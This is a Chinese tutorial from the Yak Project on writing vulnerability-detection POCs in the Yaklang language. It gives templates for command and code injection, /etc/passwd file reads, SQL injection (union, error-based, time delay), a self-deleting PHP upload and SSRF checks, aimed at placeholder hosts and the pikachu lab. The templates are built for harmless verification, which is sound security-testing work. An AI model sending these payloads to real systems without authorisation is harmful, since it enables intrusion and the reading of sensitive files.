#  来了，秋天的第一个POC   
原创 Longlone  Yak Project   2024-08-09 17:32  
  
![](/articles/wechat2md-57d4b38fb5fac67b077017855ed50c43.gif)  
![](/articles/wechat2md-3c7b63447b178dca759252db58a2f6c2.png)  
  
![](/articles/wechat2md-b767efc51500b4f158504b28c037ef6c.png)  
  
  
**⬆️ 你好，加群，谢谢 ⬆️**  
  
**立秋就这么水灵灵地过了**  
  
**又到了“秋天的第一杯奶茶”刷屏的时刻**  
  
**而我们要追求的是** **“秋天的第一个POC”**  
  
**做好变强的准备了吗**  
  
**Yak POC编写，这一篇就够了**  
  
****  
> **文章中指代的POC仅指使用 Yaklang 编程语言编写的POC**  
  
![](/articles/wechat2md-41e166a641bad190e9d0d5fa5bc8ba45.png)  
![](/articles/wechat2md-da9c230e2728d1149baba04b4f32a15f.png)  
 
在此篇文章中就不详细描述 Yaklang 语法的学习了，可以移步至YAK官网进行学习。  
  
Yaklang 的语法总的来说参考了其他许多语言，你可以看到许多语言中的影子，例如 Golang（主要），Python，JS等。这使得学习 Yaklang 的成本对于学习过相关语言（尤其是 Yaklang）的用户来说是非常低的，通常这类用户可以在 10 分钟内快速上手 Yaklang 。  
  
![](/articles/wechat2md-511d82d25d86e8cbd13fae5af954ce6d.png)  
  
在 Yakit 中，我们最常用发送 HTTP 数据包的工具非 web fuzzer 莫属了，实际上，web fuzzer的发包能力底层也是通过 Yaklang 中的 poc 库来实现的，因此，我们可以使用 Yaklang 中的 poc 库来实现大部分发送 HTTP 数据包的功能。  
  
  
在旧版的 Yaklang 中，有许多库都能够完成发包工作，例如 fuzz，httppool，http等，实际上对于编写 POC 来说，我们**只需要重点关注 poc 库即可**。  
  
****  
## **发送请求**  
### 发送 URL 请求  
  
对于如何请求一个指定的URL， poc 库提供了以下几个简单的函数：  
```
poc.Do(method, url, ...)
poc.Get(url, ...)
poc.Post(url, ...)
poc.Delete(url, ...)
poc.Options(url, ...)
```  
  
常见的发送 GET/POST/DELETE/OPTIONS 请求，我们只需要使用对应函数，第一个参数填入 URL 即可，对于要发送一些不常见请求方法的请求，我们可以使用 DO 来完成，一些简单的例子如下：  
```
poc.Do("GET", "https://example.com")
// 也可以使用
poc.Get("https://example.com")
// 发送POST请求
poc.Post("https://exapmle.com")
```  
  
通过一行代码，我们就可以快速地向目标 URL 发送请求。  
### 发送原始报文请求  
  
有些情况下，我们可能更希望能直接发送一个原始的请求报文，对此， poc 库也提供了一个好用的函数：  
```
poc.HTTPEx(raw, ...)
```  
  
我们使用poc.HTTPEx，第一个参数填入原始报文，即可将报文发送至对应目标服务器（如果没有额外指定，则是Host 请求头对应的目标服务器）。  
### 发送批量请求  
  
对于某些 POC 可能涉及到发送多个请求以及并发的问题，一个简单的控制并发例子如下：  
```
// 最多10并发
swg = sync.NewSizedWaitGroup(10)
// 发送一共100个请求
for i in 100 {
    swg.Add(1)
    go func {
        defer swg.Done()
        rsp, req = poc.Get(f"https://example.com?times=${i}")~
        println(rsp.GetStatusCode())
    }
}

swg.Wait()
```  
  
对于一些需要使用 fuzztag 的需求，我们就要用到 fuzz 这个标准库或者x前缀字符串了，先生成请求，再发送：  
```
// 最多10并发swg = sync.NewSizedWaitGroup(10)// 先生成100个请求reqRaws = x`GET /?i={{int(1-100)}} HTTP/1.1Host: www.example.com`// 再发送一共100个请求for raw in reqRaws {    swg.Add(1)    go func {        defer swg.Done()        rsp, req = poc.HTTPEx(raw)~        println(rsp.GetStatusCode())    }}swg.Wait()
```  
### 选项函数  
  
在 Yaklang 中，一个约定俗成的规定是：**以小写开头的库函数是选项函数**。  
  
在 poc 库中，也有许多这样的选项函数，可以帮助我们对这次请求进行自定义的配置，一些常用的选项函数如下：  
```
poc.host(host)               // 指定目标服务器，如果未指定则使用 Host 请求头对应的目标服务器
poc.port(port)               // 指定目标服务器端口，如果未指定则使用 Host 请求头对应的目标服务器端口
poc.timeout(floatSecond)     // 指定超时时间，单位为妙
poc.https(bool)              // 指定是否为 HTTPS 请求
poc.http2(bool)              // 指定是否为 HTTP2 请求
poc.session(sessionName)     // 指定 session 名，当设置后会使用指定 session 进行请求，用同一个session发起的请求会自动管理Cookie
poc.redirectTimes(times)     // 指定跟踪重定向的次数
poc.noRedirect(bool)         // 指定为 true 时禁止重定向，相当于poc.redirectTimes(0)
poc.redirectHandler(f)       // 使用自定义函数来控制重定向逻辑
poc.proxy(proxies)           // 指定请求使用的代理
poc.dnsServer(server)        // 指定请求使用的DNS服务器
poc.username(username)       // 指定请求认证的用户名，支持 BASIC/DIGEST/NTLM 认证
poc.password(password)       // 指定请求认证的密码
poc.noFixContentLength(bool) // 指定为 true 时发送请求时不会对请求包进行修复（Content-Length，CRLF）等
```  
  
另外，还有一些选项函数在**发送请求**前对发送的请求进行**补丁**，如添加请求头，添加请求参数等，一些常用的选项函数如下：  
```
poc.replaceQueryParam(key, value)       // 替换 GET 请求参数对应的值，如果不存在则增加
poc.replacePostParam(key, value)        // 替换 POST 请求参数对应的值，如果不存在则增加
poc.replaceHeader(key, value)           // 替换请求头对应的值，如果不存在则增加
poc.replaceUserAgent(ua)                // 替换请求的 User-Agent 请求头 
poc.replaceHost(host)                   // 替换请求的 Host 请求头
poc.replaceBody(body)                   // 替换请求体
poc.appendQueryParam(key, value)       // 添加 GET 请求参数对应的值
poc.appendPostParam(key, value)        // 添加 POST 请求参数对应的值
poc.appendHeader(key, value)           // 添加请求头对应的值
poc.deleteQueryParam(key)              // 删除 GET 请求参数对应的值
poc.deletePostParam(key)               // 删除 POST 请求参数对应的值
poc.deleteHeader(key)                  // 删除请求头对应的值
```  
  
  
**案例**  
```
rsp, req = poc.HTTPEx(
    `POST /post HTTP/1.1
Content-Type: application/json
Host: pie.dev

`, 
    poc.https(true), 
    poc.timeout(15), 
    poc.proxy("http://127.0.0.1:1080"), 
    poc.appendHeader("AAA", "BBB"),
    poc.appendQueryParam("a", "b"),
    poc.appendPostParam("c", "d"),
)~
```  
  
  
**接收与处理响应**  
  
接下来重要的一步就来了，发送请求之后我们如何拿到响应中想要的信息？  
  
上文中我们提到的发送请求的函数，其返回值都是一样的，以poc.HTTPEx为例，其函数签名为：  
```
func HTTPEx(i any, opts ...PocConfigOption) (rsp *lowhttp.LowhttpResponse, req *http.Request, err error)
```  
  
  
在三个返回值中，我们重点关注**第一个返回值**，我们想要的响应信息都存储在这里。  
  
我们可以简单地使用一行```desc(rsp)  ```代码，或者通过在 Yakit 的 Yak Runner 中鼠标悬浮提示来了解这个响应结构体及其成员的信息。  
  
我们常用到的响应信息如下：  
```
rsp.RawPacket                // 原始响应报文
rsp.GetBody()                // 原始响应体
rsp.GetStatusCode()          // 响应状态码
rsp.GetDurationFloat()       // 服务器响应时间，即服务器建立连接后到发送第一个响应字节所花的时间,通常在无回显判断漏洞检测中使用
rsp.rsp.TraceInfo.ServerTime // 与rsp.GetDurationFloat() 一样
```  
  
实际上，拿到了原始响应报文之后，我们也可以使用 poc 库中的一些辅助函数来拿到响应报文中的各种数据：  
```
poc.GetHTTPPacketFirstLine(rsp.RawPacket)          // 获取响应的协议版本，状态码，状态码描述poc.GetHTTPPacketHeader(rsp.RawPacket,key)         // 获取响应的某个请求头的值poc.GetHTTPPacketHeaders(rsp.RawPacket)            // 获取响应的所有请求头的值poc.GetHTTPPacketBody(rsp.RawPacket)               // 获取响应体
```  
  
**案例**  
```
rsp, req = poc.HTTPEx(
    `POST /post HTTP/1.1
Content-Type: application/json
Host: pie.dev

`, 
    poc.https(true), 
    poc.timeout(15), 
    poc.proxy("http://127.0.0.1:1080"), 
    poc.appendHeader("AAA", "BBB"),
    poc.appendQueryParam("a", "b"),
    poc.appendPostParam("c", "d"),
)~
body = rsp.GetBody()
code = rsp.GetStatusCode()
t = rsp.GetDurationFloat()
```  
  
  
![](/articles/wechat2md-94695ccc863d401ea299f5c0380f9872.png)  
  
第三步也是最关键的一步，在编写一个 POC 之前，我们需要了解其定位，或者说这个漏洞是属于什么类型的，这样我们才能更好地去思考漏洞检测逻辑，编写 POC。以下列出一些常见漏洞的 POC 编写模版。  
  
## **代码执行/命令执行**  
此类漏洞能够实现的功能很多，因此我们漏洞的检测逻辑不应该简单地执行echo，同时我们要考虑到目标操作系统的问题（Windows/Linux等）。  
  
那么我们如何优雅而又有效地检测代码执行或者命令执行呢？  
  
这里提供的思路是：计算，即我们通过脚本语言或者系统 Shell 中存在的函数/特性/命令来去执行计算，并根据计算结果来确认漏洞是否存在  
  
**案例：命令执行 -  Linux**  
```
// 计算与判断两个整数的和
i,j = randn(1000, 2000), randn(100, 999)
sum = i + j
cmd = codec.EscapeQueryUrl(f"expr ${i}+${j}")
rsp, req = poc.HTTPEx(f`GET /rce?cmd=${cmd} HTTP/1.1
Host: www.vulnerable.com

`)~
if string(sum) in rsp.RawPacket {
    dump("存在漏洞")
}
```  
  
**案例：命令执行 -  Windows**  
```
// 计算与判断两个整数的和i,j = randn(1000, 2000), randn(100, 999)sum = i + jcmd = codec.EscapeQueryUrl(f`cmd /c "set /a ${i}+${j}"`)rsp, req = poc.HTTPEx(f`GET /rce?cmd=${cmd} HTTP/1.1Host: www.vulnerable.com`)~if string(sum) in rsp.RawPacket {    dump("存在漏洞")}
```  
  
**案例：命令执行 - 不知道目标操作系统**  
  
这里的思路是多发几个请求，满足一个就行  
```
// 计算与判断两个整数的和
func checkPacket(command, want) {
    cmd = codec.EscapeQueryUrl(f`cmd /c "set /a ${i}+${j}"`)
    rsp, req = poc.HTTPEx(f`GET /rce?cmd=${cmd} HTTP/1.1
Host: www.vulnerable.com

`)~
    return string(want) in rsp.RawPacket
}

i,j = randn(1000, 2000), randn(100, 999)
sum = i + j
linuxCmd = codec.EscapeQueryUrl(f"expr ${i}+${j}")
windowsCmd = codec.EscapeQueryUrl(f`cmd /c "set /a ${i}+${j}"`)
if checkPacket(linuxCmd, sum) || checkPacket(windowsCmd, sum) {
    dump("存在漏洞")
}
```  
  
**案例：代码执行 - PHP**  
```
// 计算与判断一个随机字符串的MD5
s = randstr(16)
cmd = codec.EscapeQueryUrl(f`echo md5("${s}");`)
rsp, req = poc.HTTPEx(f`GET /rce?code=${cmd} HTTP/1.1
Host: www.vulnerable.com

`)~
if codec.Md5(s) in rsp.RawPacket {
    dump("存在漏洞")
}
```  
  
  
在其他操作系统与脚本语言中一样能找到类似的函数来进行**计算**，通过这种方法来判断此类漏洞，就可以减少误报的发生。  
  
  
## **文件读取**  
  
此类漏洞我们主要思考的是读取文件的路径，一般寻找固定位置和固定特征以及默认存在的文件，同时要考虑目标操作系统的问题（Windows/Linux等）。  
  
**案例：Linux**  
  
以/etc/passwd为例：  
```
fp = "/etc/passwd"
rsp, req = poc.HTTPEx(f`GET /file_read?file=${fp} HTTP/1.1
Host: www.vulnerable.com

`)~
body = rsp.GetBody()
if rsp.GetStatusCode() == 200 && len(body) > 0 && "root:x:" in body && "nobody:x:" in body {
    dump("存在漏洞")
}
```  
  
**案例：Windows**  
  
以C:\Windows\win.ini为例：  
```
fp = "C:\\Windows\\win.ini"
rsp, req = poc.HTTPEx(f`GET /file_read?file=${fp} HTTP/1.1
Host: www.vulnerable.com

`)~
body = rsp.GetBody()
if rsp.GetStatusCode() == 200 && len(body) > 0 && "16-bit app support" in body {
    dump("存在漏洞")
}
```  
  
  
## **SQL注入**  
  
此类漏洞我们首先需要知道的是有没有回显，根据回显的有无，我们可以通过不同的方式进行判断。  
  
**案例：有回显 - 联合注入**  
```
// 假设服务器 SQL 查询语句为：select username, password from users where username = '%s'，其中%s为用户可控，存在SQL注入
s = randstr(16)
username = codec.EscapeQueryUrl(f`xxxxx' union all select 1,md5('${s}'); -- `)
rsp, req = poc.HTTPEx(f`GET /union_sql?username=${username} HTTP/1.1
Host: www.vulnerable.com

`)~
body = rsp.GetBody()
if len(body) > 0 && codec.Md5(s) in body {
    dump("存在漏洞")
}
```  
  
**案例：有回显 - 报错注入**  
```
// 假设服务器 SQL 查询语句为：select username, password from users where username = '%s'，其中%s为用户可控，存在SQL注入
s = randstr(16)
username = codec.EscapeQueryUrl(f`1' and updatexml(1,concat(0x7e,md5('${s}'),0x7e,1,0x7e,2),1)-- `)
rsp, req = poc.HTTPEx(f`GET /error_sql?username=${username} HTTP/1.1
Host: www.vulnerable.com

`)~
body = rsp.GetBody()
if len(body) > 0 && codec.Md5(s) in body {
    dump("存在漏洞")
}
```  
  
**案例：无回显 - 延迟注入**  
```
// 假设服务器 SQL 查询语句为：select username, password from users where username = '%s'，其中%s为用户可控，存在SQL注入
// 假设已知一个存在的用户名kobe
username = codec.EscapeQueryUrl(f`kobe' and sleep(3)-- `)
rsp, req = poc.HTTPEx(f`GET /no_output_sql?username=${username} HTTP/1.1
Host: www.vulnerable.com

`)~
body = rsp.GetBody()
if rsp.GetDurationFloat() > 3 {
    dump("存在漏洞")
}
```  
  
  
## **文件上传**  
  
对于此类漏洞，需要思考的是如何在没有危害的情况下验证漏洞的存在，因此一般在可能的情况下会考虑**计算输出+自我删除**的形式。  
  
**案例：PHP**  
```
// 这里以 pikachu 靶场的文件上传为例
s = randstr(16)
// 上传
rsp, req = poc.HTTPEx(f`POST /vul/unsafeupload/clientcheck.php HTTP/1.1
Host: 127.0.0.1:8765
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Referer: http://172.27.214.38:8765/vul/unsafeupload/clientcheck.php
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzO5eB8A7KMQZG4Ml
Content-Length: 38747

------WebKitFormBoundaryzO5eB8A7KMQZG4Ml
Content-Disposition: form-data; name="uploadfile"; filename="abc.php"
Content-Type: image/png

<?php
echo md5("${s}");
unlink(__FILE__);
?>
------WebKitFormBoundaryzO5eB8A7KMQZG4Ml
Content-Disposition: form-data; name="submit"

开始上传
------WebKitFormBoundaryzO5eB8A7KMQZG4Ml--`)~
// 这里可以根据上传请求的响应来拿到文件上传的路径
body = rsp.GetBody()
uploadFilePath = ""
if "文件保存的路径为：" in body {
    uploadFilePath = body.Split("文件保存的路径为：")[1].Split("</p>")[0].Trim()
}

// 漏洞不存在
if uploadFilePath == "" {
    return 
}

// 访问上传的文件
rsp, req = poc.HTTPEx(f`GET /vul/unsafeupload/${uploadFilePath} HTTP/1.1
Host: 127.0.0.1:8765
`)~

body = rsp.GetBody()
if codec.Md5(s) in body {
    dump("存在漏洞")
}
```  
  
  
## **服务端请求伪造（SSRF）**  
  
此类漏洞首先需要知道的也是有没有回显，根据回显的有无，我们可以通过不同的方式进行判断。  
  
**案例：有回显 通过curl请求 linux**  
  
此案例思路与前文中文件读取差不多，只是访问路径为file:///etc/passwd  
```
// 这里以 pikachu 靶场的SSRF为例
url = codec.EscapeQueryUrl(f`file:///etc/passwd`)
rsp, req = poc.HTTPEx(f`GET /vul/ssrf/ssrf_curl.php?url=${url} HTTP/1.1
Host: 127.0.0.1:8765

`)~
body = rsp.GetBody()
if rsp.GetStatusCode() == 200 && len(body) > 0 && "root:x:" in body && "nobody:x:" in body {
    dump("存在漏洞")
}
```  
  
**案例：有回显 php 通过file_get_contents请求 linux**  
  
在此案例中，我们可以考虑使用php的伪协议，使用data协议来安全地读取一段随机字符串，再判断响应中是否存在该字符串  
```
// 这里以 pikachu 靶场的SSRF为例
s = randstr(16)
url = codec.EscapeQueryUrl(f`data://text/plain;base64,`) + codec.EncodeBase64(s)
rsp, req = poc.HTTPEx(f`GET /vul/ssrf/ssrf_fgc.php?file=${url} HTTP/1.1
Host: 172.27.214.38:8765

`)~
body = rsp.GetBody()
if rsp.GetStatusCode() == 200 && len(body) > 0 && s in body {
    dump("存在漏洞")
}
```  
  
**案例：无回显 通过curl请求 出网 linux**  
```
// 这里以 pikachu 靶场的SSRF为例domain, token = risk.NewDNSLogDomain()~url = codec.EscapeQueryUrl(f`http://${domain}`)rsp, req = poc.HTTPEx(f`GET /vul/ssrf/ssrf_curl.php?url=${url} HTTP/1.1Host: 127.0.0.1:8765`)~events = risk.CheckDNSLogByToken(token, 5)~if len(events) > 0 {    dump("存在漏洞")}
```  
  
![](/articles/wechat2md-6b3997508d598af5c84ccc304b7a1e86.png)  
  
可能会有师傅发现，有的漏洞我并没有给模板，例如反序列化，XSS等漏洞，但是实际上上面的模板已经囊括了许多漏洞危害下的 POC 了。  
  
举个例子，反序列化漏洞可能利用过程比较复杂，但是实际上造成的危害通常都是上述一些漏洞造成的危害，如命令执行，文件读取，服务端请求伪造等，也可以通过上面的依据来无害化判断漏洞是否存在。  
  
对上述的模板进行总结：  
  
  
- 对于**有回显**的漏洞，我们普遍采用**计算**的方式来验证漏洞，不论是 哈希计算（如md5）还是算数计算（如加法）也好，检测计算后的结果是否存在于响应中，比直接检测某个输入直接在响应中要**靠谱得多**。  
  
  
  
  
- 对于**无回显**的漏洞，我们可以采用**延时**或者**外带**的方式来验证漏洞  
  
  
  
- 延时：代码执行/数据库中的睡眠函数，命令执行中的睡眠命令  
  
- 外带：通常指 DNSLog或HTTPLog  
  
  
  
  
  
  
**END**  
  
  
  
 **YAK官方资源**  
  
  
Yak 语言官方教程：  
https://yaklang.com/docs/intro/Yakit   
视频教程：  
https://space.bilibili.com/437503777Github  
下载地址：  
https://github.com/yaklang/yakitYakit  
官网下载地址：  
https://yaklang.com/Yakit  
安装文档：  
https://yaklang.com/products/download_and_install  
Yakit使用文档：  
https://yaklang.com/products/intro/  
常见问题速查：  
https://yaklang.com/products/FAQ  
  
![](/articles/wechat2md-85062b6e6c63b9d9d17d1e2a5ca2ec01.other)  
长按识别添加工作人员
开启Yakit进阶之旅  
![](/articles/wechat2md-14665f86963c7c123b43378ebc55bb0f.other)  
  
  
  
